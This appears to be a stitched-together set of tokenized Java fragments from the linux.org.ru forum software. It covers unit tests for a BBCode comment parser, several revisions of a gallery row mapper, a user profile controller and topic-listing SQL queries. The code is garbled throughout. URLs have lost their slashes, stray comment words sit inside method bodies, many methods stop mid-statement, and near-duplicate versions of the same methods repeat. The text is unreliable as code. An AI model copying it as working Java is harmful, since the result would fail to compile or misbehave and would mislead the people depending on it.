public void urlTestNoFollow ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" rel=nofollow>http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false , true ) ) ; Assert . assertEquals ( " <p><a href= \" http:127.0.0.1:8080 \" >http:127.0.0.1:8080</a></p> " , 
public void autoUrlTestNoFollow ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru/ \" rel=nofollow>http:linux.org.ru/</a></p> " , lorCodeService . parseComment ( " http:linux.org.ru/ " , false , true ) ) ; Assert . assertEquals ( " <p><a href= \" http:127.0.0.1:8080/ \" >127.0.0.1:8080/</a></p> " , 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/URL] " , false , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]l[/b]inux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]linux[/b][/url] " , false , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/LIST]</code></pre></div> " , lorCodeService . parseComment ( " [CODE][list][*]one[*]two[*]three[/LIST][/code] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/CODE] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[LIST][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[LIST][*]one[*]two[*]three[/list][/CODE] " , false , false ) ) ; 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/CODE] " , false , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=cxx]#include <stdio.h>[/code] " , false , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=foo]#include <stdio.h>[/code] " , false , false ) ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[QUOTE][i]hz[/I][/quote] " , false , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [URL=http:example.com]example[/url] example " , false , false ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , true , false ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/URL] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com']example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com]example[/url] " , false , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/LIST] " , false , false ) ) ; 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false , false ) ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false , false ) ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/code] " , false , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=cxx]#include <stdio.h>[/code] " , false , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=foo]#include <stdio.h>[/code] " , false , false ) ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false , false ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , true , false ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com']example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com]example[/url] " , false , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/list] " , false , false ) ) ; 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false , false ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false , false ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false , false ) ) ; 
public void paragraphLogicTest ( ) { list Assert.assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, false)); b Assert.assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, false)); i Assert.assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, false)); u Assert.assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, false)); s Assert.assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, false)); em Assert.assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, false)); strong Assert.assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, false)); p Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, false)); div Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, false)); quote Assert.assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, false)); cut Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, false)); user Assert.assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false, false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, false)); 
public void testBadId ( ) throws Exception { LorURL uri = new LorURL ( mainLORURI , " http:www.linux.org.ru/forum/talks/12345678910 " ) ; assertTrue ( uri . isTrueLorUrl ( ) ) ; assertFalse ( uri . isMessageUrl ( ) ) ; assertFalse ( uri . isCommentUrl ( ) ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " original " ) ) ; item . setIcon ( rs . getString ( " icon " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; try { item . setInfo ( new ImageInfo ( htmlPath + image . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + image . getOriginal ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; try { item . setInfo ( new ImageInfo ( htmlPath + image . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + image . getOriginal ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( COUNT_ITEMS ) ) ; mav . addObject ( " items " , list ) ; return mav ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; try { item . setInfo ( new ImageInfo ( htmlPath + image . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + image . getOriginal ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { try { builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } } return builder . build ( ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = configuration . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { try { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } catch ( BadImageException e ) { logger . error ( " Bad image id= " + item . getImage ( ) . getId ( ) , e ) ; } catch ( IOException e ) { logger . error ( " Bad image id= " + item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) ) { return false ; } return author . getScore ( ) > = TopicPermissionService . LINK_FOLLOW_MIN_SCORE ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { UserStatistics userStat = userDao . getUserStatisticsClass ( user ) ; mv . getModel ( ) . put ( " userStat " , userStat ) ; mv . getModel ( ) . put ( " sectionStat " , prepareSectionStats ( userStat ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( tmpl . getCurrentUser ( ) , user ) ) ; } if ( tmpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( tmpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; if ( ! Strings . isNullOrEmpty ( userinfo ) ) { mv . getModel ( ) . put ( " userInfoText " , lorCodeService . parseComment ( userinfo , request . isSecure ( ) , ! topicPermissionService . followAuthorLinks ( user ) ) ) ; } mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean firstPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND (sticky or postdate>CURRENT_TIMESTAMP-'3 month'::interval) " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY sticky DESC, msgid DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > topicsList = new ArrayList < TopicsListItem > ( ) ; while ( rs . next ( ) ) { User author ; try { author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } ImmutableList < String > tags = topicTagService . getMessageTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem topic = new TopicsListItem ( author , rs , messagesInPage , tags ) ; topicsList . add ( topic ) ; } return topicsList ; } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY msgid DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } List < TopicsListItem > mainTopics = prepareTopic ( rs , messagesInPage ) ; if ( year = = null & & offset = = 0 & & ! lastmod ) { List < TopicsListItem > stickyTopics = getStickyTopics ( group , messagesInPage ) ; 
